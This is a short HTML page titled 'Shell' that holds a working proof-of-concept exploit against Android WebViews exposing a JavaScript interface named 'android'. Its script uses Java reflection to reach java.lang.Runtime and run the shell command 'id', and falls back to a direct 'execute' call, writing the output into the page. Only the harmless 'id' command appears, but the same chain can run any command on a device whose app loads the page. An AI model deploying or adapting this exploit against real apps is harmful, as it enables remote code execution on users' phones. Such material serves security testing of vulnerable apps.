<html>
<head>
<title>Shell</title>
</head>
<body>
<script>
try {
    var result = window.android.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id');
    document.write('Executed: ' + result);
} catch (e) {
    try {
        var cmd = window.android.execute('id');
        document.write('Executed2: ' + cmd);
    } catch (e2) {
        document.write('Error: ' + e2);
    }
}
</script>
</body>
</html>
